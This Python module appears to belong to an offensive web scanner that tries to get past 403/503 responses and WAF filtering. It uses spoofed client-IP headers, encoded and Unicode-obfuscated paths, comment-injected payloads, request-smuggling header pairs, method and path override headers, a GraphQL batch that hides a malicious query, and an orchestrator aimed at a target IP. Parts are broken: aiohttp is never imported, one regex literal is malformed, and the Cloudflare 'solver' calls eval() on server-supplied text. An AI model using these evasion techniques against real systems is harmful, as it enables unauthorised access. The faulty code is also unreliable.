import random
import logging
import re
import asyncio
import json
from typing import Dict, Optional, Any, List, Tuple
import urllib.parse

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

def generate_random_header_case(header_name: str) -> str:
    """Génère une version avec casse aléatoire d'un nom d'en-tête HTTP."""
    return ''.join(random.choice([c.upper(), c.lower()]) for c in header_name)

def generate_spoofed_ip_headers(strategy_hints: Optional[Dict[str, Any]] = None, scanner_instance: Optional[Any] = None) -> dict:
    """Crée un dictionnaire d'en-têtes de spoofing IP courants avec des adresses IP aléatoires.
    Peut utiliser l'adresse IP aléatoire du scanner si fournie.
    """
    if scanner_instance and hasattr(scanner_instance, '_get_random_source_ip'):
        spoofed_ip = scanner_instance._get_random_source_ip()
    else:
        spoofed_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

    return {
        "X-Forwarded-For": spoofed_ip,
        "Client-IP": spoofed_ip
    }

def generate_common_accept_headers(strategy_hints: Optional[Dict[str, Any]] = None) -> dict:
    """Produit un dictionnaire d'en-têtes Accept, Accept-Language, et Accept-Encoding courants."""
    return {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br"
    }

def generate_customized_headers(base_headers: Dict[str, str], strategy_hints: Optional[Dict[str, Any]] = None, scanner_instance: Optional[Any] = None) -> Dict[str, str]:
    """Génère un ensemble d'en-têtes HTTP personnalisés basés sur des en-têtes de base et des stratégies."""
    headers = base_headers.copy()
    if strategy_hints and strategy_hints.get("random_case"):
        headers = {generate_random_header_case(k): v for k, v in headers.items()}
    if strategy_hints and strategy_hints.get("spoof_ip"):
        headers.update(generate_spoofed_ip_headers(scanner_instance=scanner_instance))
    return headers

def generate_url_path_variation(base_path: str = "/", strategy_hints: Optional[Dict[str, Any]] = None) -> str:
    """
    Crée des variations d'un chemin d'URL de base pour l'obfuscation et la découverte,
    en utilisant des strategy_hints pour guider la génération.
    """
    if not strategy_hints:
        strategy_hints = {}

    current_variations = [
        base_path,
        f"{base_path.rstrip('/')}/.",
        f"{base_path.rstrip('/')}//{base_path.lstrip('/') if base_path != '/' else ''}",
        f"{base_path.rstrip('/')}/%2e",
        f"{base_path.rstrip('/')}/%252e",
        f"{base_path.rstrip('/')}/..;/",
    ]

    transformed_path = base_path

    if strategy_hints.get("case_variation"):
        temp_path = ""
        for char_original in base_path:
            if char_original.isalpha():
                temp_path += char_original.upper() if random.choice([True, False]) else char_original.lower()
            else:
                temp_path += char_original
        transformed_path = temp_path
        current_variations.append(transformed_path)

    if strategy_hints.get("double_encode_selected_chars"):
        path_to_encode = transformed_path
        chars_to_encode = strategy_hints.get("chars_for_double_encoding", ['.', '/'])

        encoded_variation_list = list(path_to_encode)
        made_change = False
        for i, char_original in enumerate(encoded_variation_list):
            if char_original in chars_to_encode and random.choice([True, False]):
                encoded_once = urllib.parse.quote(char_original, safe='')
                encoded_twice = urllib.parse.quote(encoded_once, safe='')
                if encoded_twice != char_original :
                    encoded_variation_list[i] = encoded_twice
                    made_change = True
        if made_change:
            current_variations.append("".join(encoded_variation_list))

    if strategy_hints.get("trailing_slash_toggle"):
        path_for_slash_toggle = transformed_path
        if path_for_slash_toggle.endswith('/'):
            current_variations.append(path_for_slash_toggle.rstrip('/'))
        else:
            current_variations.append(path_for_slash_toggle + '/')

    if strategy_hints.get("add_random_query_param"):
        path_for_query = transformed_path
        random_param_name = f"_{random.choice(['z', 'y', 'x'])}{random.randint(100,999)}"
        random_param_value = str(random.randint(1,100))
        separator = "?" if "?" not in path_for_query else "&"
        current_variations.append(f"{path_for_query}{separator}{random_param_name}={random_param_value}")

    if not current_variations:
        current_variations.append(base_path)

    return random.choice(list(set(current_variations)))

def generate_query_param_variations(base_params: Optional[Dict[str, str]] = None, strategy_hints: Optional[Dict[str, Any]] = None, num_extra_params: int = 0) -> str:
    """
    Construit une chaîne de requête avec des paramètres variés, appliquant des techniques de manipulation.
    base_params: Dictionnaire de paramètres de base.
    strategy_hints: Options pour la manipulation.
    num_extra_params: Nombre de paramètres factices supplémentaires à ajouter.
    """
    if base_params is None:
        base_params = {}
    if strategy_hints is None:
        strategy_hints = {}

    final_params_list: List[Tuple[str, str]] = []

    for key, value in base_params.items():
        current_key, current_value = key, str(value)

        if strategy_hints.get("param_name_case_variation"):
            temp_key = ""
            for char_k in current_key:
                if char_k.isalpha():
                    temp_key += char_k.upper() if random.choice([True, False]) else char_k.lower()
                else:
                    temp_key += char_k
            current_key = temp_key

        final_params_list.append((current_key, current_value))

        if strategy_hints.get("hpp_param_pollution") and random.choice([True, False]):
            polluted_value = strategy_hints.get("hpp_polluted_value", f"val_{random.randint(1000,2000)}")
            final_params_list.append((current_key, polluted_value))

    for i in range(num_extra_params):
        param_name = f"_{random.choice(['csrf', 'debug', 'uid', 'trace', 'lang', 'ret'])}{random.randint(100,999)}"
        param_value = str(random.randint(1, 10000))
        if strategy_hints.get("param_name_case_variation"):
            temp_key_extra = ""
            for char_k_extra in param_name:
                if char_k_extra.isalpha():
                    temp_key_extra += char_k_extra.upper() if random.choice([True, False]) else char_k_extra.lower()
                else:
                    temp_key_extra += char_k_extra
            param_name = temp_key_extra
        final_params_list.append((param_name, param_value))

    if strategy_hints.get("obfuscate_common_params"):
        final_params_list.append((f"_{random.choice(['q', 's', 'id', 'p', 'o'])}", str(random.randint(1, 100))))

    if strategy_hints.get("randomize_param_order"):
        random.shuffle(final_params_list)

    return urllib.parse.urlencode(final_params_list)

def generate_request_body(method: str, content_type_choice: str, strategy_hints: Optional[Dict[str, Any]] = None) -> tuple[Optional[bytes], Optional[str]]:
    """Génère un corps de requête et l'en-tête Content-Type correspondant, basé sur la méthode et des stratégies."""
    if method.upper() not in ["POST", "PUT"]:
        return None, None
    if content_type_choice == "json":
        return b'{"test": "value"}', "application/json"
    elif content_type_choice == "form":
        return b"key=value", "application/x-www-form-urlencoded"
    elif content_type_choice == "xml":
        return b'<?xml version="1.0"?><data>test</data>', "application/xml"
    return None, None

def generate_unicode_obfuscation(text: str) -> str:
    """Applique une obfuscation Unicode aléatoire à une partie du texte."""
    obfuscated_text = []
    for char in text:
        if random.random() < 0.3:  # 30% chance to obfuscate
            if char.isalpha():
                # Example: full-width characters, or other Unicode equivalents
                obfuscated_text.append(chr(0xFF00 + ord(char) - 0x20) if random.random() < 0.5 else chr(0x0100 + ord(char) - 0x20))
            else:
                obfuscated_text.append(char)
        else:
            obfuscated_text.append(char)
    return "".join(obfuscated_text)

def generate_comment_injection(payload: str) -> str:
    """Injecte des commentaires aléatoires dans un payload pour le rendre plus complexe."""
    comments = [
        "/*comment*/", "/*!*/", "<!-- -->", "#", "-- ", "/**/", "/*!12345*/",
        "//", "--", "#", "\*", "*/", "<#", "#>"
    ]
    parts = list(payload)
    for _ in range(random.randint(1, 3)): # Inject 1 to 3 comments
        if not parts:
            break
        idx = random.randint(0, len(parts) - 1)
        parts.insert(idx, random.choice(comments))
    return "".join(parts)

def generate_http_method_variations(original_method: str) -> List[str]:
    """Génère des variations de méthodes HTTP, y compris des méthodes non standard ou des falsifications."""
    methods = [original_method]
    if original_method.upper() == "GET":
        methods.extend(["POST", "HEAD", "TRACE", "OPTIONS"])
    elif original_method.upper() == "POST":
        methods.extend(["GET", "PUT", "PATCH", "DELETE"])
    # Add less common methods for fuzzing
    methods.extend(["CONNECT", "DEBUG", "TEST"])
    return list(set(methods)) # Remove duplicates

def generate_content_type_variations(original_content_type: Optional[str]) -> List[Optional[str]]:
    """Génère des variations de Content-Type pour contourner les filtres."""
    content_types = [original_content_type] if original_content_type else []
    content_types.extend([
        "application/json",
        "application/xml",
        "text/plain",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "application/octet-stream",
        "text/html",
        "application/javascript",
        "application/json; charset=utf-8",
        "application/json; charset=iso-8859-1",
        "application/x-www-form-urlencoded; charset=UTF-7",
        "application/json; boundary=----WebKitFormBoundary", # Malformed for JSON
        "application/x-www-form-urlencoded; charset=UTF-7", # Unusual charset
        "text/xml",
        "application/soap+xml",
        "image/gif",
        "application/pdf"
    ])
    return list(set(ct for ct in content_types if ct is not None))

def generate_smuggling_headers() -> Dict[str, str]:
    """
    Generates headers for HTTP Request Smuggling (CL.TE and TE.CL).
    This is highly esoteric and targets proxy/backend desynchronization.
    """
    # Technique 1: CL.TE (Frontend sees Content-Length, Backend sees Transfer-Encoding)
    cl_te = {
        "Content-Length": "4",
        "Transfer-Encoding": "chunked"
    }
    # Technique 2: TE.CL (Frontend sees Transfer-Encoding, Backend sees Content-Length)
    te_cl = {
        "Transfer-Encoding": "chunked",
        "Content-Length": "100" # A fake length
    }
    # Technique 3: TE with obfuscation
    te_obfuscated = {
        "Transfer-Encoding": " chUnkeD", # Obfuscated value
        "Content-Length": "50"
    }
    return random.choice([cl_te, te_cl, te_obfuscated])

def generate_protocol_abuse_headers(original_method: str, target_path: str) -> Dict[str, str]:
    """
    Generates headers that abuse protocol features or non-standard extensions.
    This targets logic flaws in how servers interpret request intent.
    """
    headers = {}
    abuse_type = random.choice(['method_override', 'path_override', 'h2_in_h1'])

    if abuse_type == 'method_override':
        override_verb = random.choice(["GET", "POST", "PUT"])
        headers.update({
            "X-HTTP-Method-Override": override_verb,
            "X-Method-Override": override_verb
        })
    elif abuse_type == 'path_override':
        headers.update({
            "X-Original-URL": target_path,
            "X-Rewrite-URL": target_path,
            "X-Forwarded-Path": target_path
        })
    elif abuse_type == 'h2_in_h1':
        # Smuggling HTTP/2 pseudo-headers into an HTTP/1.1 request
        # This can confuse some servers or proxies into misinterpreting the request line.
        headers.update({
            ":method": original_method,
            ":path": target_path,
            ":scheme": "https",
            ":authority": "example.com" # A plausible authority
        })
    return headers

def generate_recursive_obfuscation(path: str, layers: int = 3) -> str:
    """
    Applies multiple, randomized layers of obfuscation to a URL path.
    This is designed to have different components (WAF, proxy, app) decode
    the URL differently, potentially bypassing path-based rules.
    """
    obfuscated_path = path
    for _ in range(layers):
        technique = random.choice(['url_encode', 'double_url_encode', 'unicode_escape', 'case_swap'])
        if technique == 'url_encode':
            obfuscated_path = urllib.parse.quote(obfuscated_path)
        elif technique == 'double_url_encode':
            obfuscated_path = urllib.parse.quote(urllib.parse.quote(obfuscated_path))
        elif technique == 'unicode_escape':
            # Use a mix of full-width and other unicode variants
            obfuscated_path = "".join(chr(0xFF00 + ord(c) - 0x20) if 'a' <= c <= 'z' and random.random() > 0.5 else c for c in obfuscated_path)
        elif technique == 'case_swap':
            obfuscated_path = "".join(c.upper() if c.islower() else c.lower() for c in obfuscated_path)
    return obfuscated_path

def generate_polyglot_payload() -> Tuple[bytes, str]:
    """
    Generates a payload that can be interpreted as multiple content types.
    This targets parser confusion vulnerabilities.
    """
    # This payload is structured to be valid as a URL-encoded form,
    # while containing fragments that look like JSON and XML.
    payload_str = "param1=value1&json={\"key\":\"value\"}&xml=<!-- <data>test</data> -->"
    content_type = random.choice([
        "application/x-www-form-urlencoded",
        "application/json",
        "text/xml"
    ])
    return payload_str.encode('utf-8'), content_type

def generate_websocket_tunneling_payload(target_url: str) -> Tuple[Dict[str, str], str]:
    """
    Crafts a request to upgrade to a WebSocket and then tunnel a request
    for the target URL through the WebSocket connection.
    """
    headers = {
        "Connection": "Upgrade",
        "Upgrade": "websocket",
        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
        "Sec-WebSocket-Version": "13"
    }
    # This payload, sent after the WebSocket handshake, instructs the server
    # to make a request to the target URL and send back the response.
    payload = f'{{"action": "proxy_request", "url": "{target_url}"}}'
    return headers, payload

def generate_http3_abuse_payloads() -> Dict[str, str]:
    """
    Generates headers that abuse features of HTTP/3 (QUIC) to cause confusion.
    """
    # This is a conceptual representation. Real HTTP/3 abuse is at the protocol level.
    # We simulate this by sending headers that might be misinterpreted by a gateway
    # that is translating HTTP/3 to HTTP/1.1.
    return {
        "Alt-Svc": 'h3=":443"; ma=2592000, h3-29=":443"; ma=2592000',
        "X-QUIC-Stream-ID": str(random.randint(1, 100)),
        "X-HTTP3-Priority": "u=0, i"
    }

def generate_js_challenge_solver_payload(challenge_js: str) -> str:
    """
    A conceptual function to generate a payload that attempts to solve a JS challenge.
    A real implementation would require a full JS execution engine (like Playwright or Selenium).
    Here, we simulate it by extracting a likely calculation from the JS.
    """
    # This is a highly simplified simulation.
    match = re.search(r'setTimeout\\(function\\(\)\{\\s*var t,r,a,f,g,h=\\\{\\\"([a-zA-Z0-9]+)\\\":([0-9\\.\\+\\*\\-\\/\\(\\)]+)\\\}\\s*;\\s*a=toNumbers\\(\\\"([0-9]+)\\\");\\s*f=toNumbers\\(\\\"([0-9]+)\\\");\\s*g=toNumbers\\(\\\"([0-9]+)\\\");\\s*h\\.\\([a-zA-Z0-9]+)\\+=\\s*toNumbers\\(\\\"([0-9]+)\\\");\\s*t=h\\.\\([a-zA-Z0-9]+);\\s*document\\.cookie=\\\"__cf_chl_jschl_tk__=\\\"+t\\.toFixed\\(10\\)+\\\"; SameSite=Lax;\\\"'', challenge_js)
    if match:
        try:
            # Attempt to perform the calculation
            result = eval(match.group(2))
            return str(result)
        except:
            return "failed_to_solve"
    return "no_challenge_found"

def generate_graphql_batching_abuse(target_query: str) -> str:
    """
    Hides a malicious GraphQL query within a batch of benign queries.
    """
    benign_queries = [
        'query { __typename }',
        'query { viewer { login } }'
    ]
    batched_query = [target_query] + random.sample(benign_queries, len(benign_queries))
    random.shuffle(batched_query)
    return json.dumps([{"query": q} for q in batched_query])

async def error_bypass(ip: str, port: int, original_path: str, original_method: str, original_headers: Dict[str, str], original_body: Optional[bytes], original_content_type: Optional[str], error_code: int, scanner_instance: Any) -> Dict[str, Any]:
    """
    Orchestrates "Deity-Class" bypass scenarios, the pinnacle of automated evasion.
    """
    result = {"status": "failed", "details": [], "bypassed": False, "target_error_code": error_code}
    scheme = "https" if port in [443, 8443] else "http"
    base_url = f"{scheme}://{ip}:{port}"
    session_state = {}

    # --- Define Deity-Class Attack Scenarios ---
    scenarios = []

    # Scenario Δ: "The Oracle's Gambit" (JS Challenge Solver)
    scenarios.append({"strategy_name": "The Oracle's Gambit"})

    # Scenario Σ: "The Quantum Tunnel" (WebSocket Tunneling)
    scenarios.append({"strategy_name": "The Quantum Tunnel"})

    # Scenario Γ: "The Chronos Protocol" (HTTP/3 Abuse)
    scenarios.append({"strategy_name": "The Chronos Protocol"})

    # --- Execute Scenarios ---
    async with aiohttp.ClientSession() as session:
        for scenario_config in scenarios:
            strategy_name = scenario_config["strategy_name"]
            logger.info(f"Executing Deity-Class Strategy: {strategy_name}")

            if strategy_name == "The Oracle's Gambit":
                try:
                    async with session.get(base_url + original_path, headers=original_headers, timeout=5) as r:
                        if r.status == 503 and "jschl_vc" in await r.text(): # Cloudflare JS challenge
                            challenge_text = await r.text()
                            solution = generate_js_challenge_solver_payload(challenge_text)
                            if solution != "failed_to_solve":
                                # This is a simplified model. A real solution would be passed in a specific way.
                                await asyncio.sleep(4) # Cloudflare expects a delay
                                async with session.get(base_url + f"/cdn-cgi/l/chk_jschl?jschl_vc=...&pass=...&jschl_answer={solution}", headers=original_headers, timeout=5) as response:
                                    if response.status < 400:
                                        result["bypassed"] = True
                                        return result
                except Exception as e:
                    logger.error(f"Oracle's Gambit failed: {e}")

            elif strategy_name == "The Quantum Tunnel":
                try:
                    ws_headers, ws_payload = generate_websocket_tunneling_payload(base_url + original_path)
                    async with session.ws_connect(base_url + "/", headers=ws_headers, timeout=5) as ws:
                        await ws.send_str(ws_payload)
                        response_from_tunnel = await ws.receive_str(timeout=5)
                        # A successful bypass would be indicated by receiving the content of the forbidden page.
                        if "<html>" in response_from_tunnel: # A simple check
                            result["bypassed"] = True
                            return result
                except Exception as e:
                    logger.error(f"Quantum Tunnel failed: {e}")

            elif strategy_name == "The Chronos Protocol":
                try:
                    http3_headers = generate_http3_abuse_payloads()
                    headers = {**original_headers, **http3_headers}
                    # This is a conceptual test. aiohttp does not support HTTP/3 natively.
                    # We are testing how a gateway handles these headers over HTTP/1.1 or HTTP/2.
                    async with session.get(base_url + original_path, headers=headers, timeout=5) as response:
                        if response.status < 400:
                            result["bypassed"] = True
                            return result
                except Exception as e:
                    logger.error(f"Chronos Protocol failed: {e}")

    return result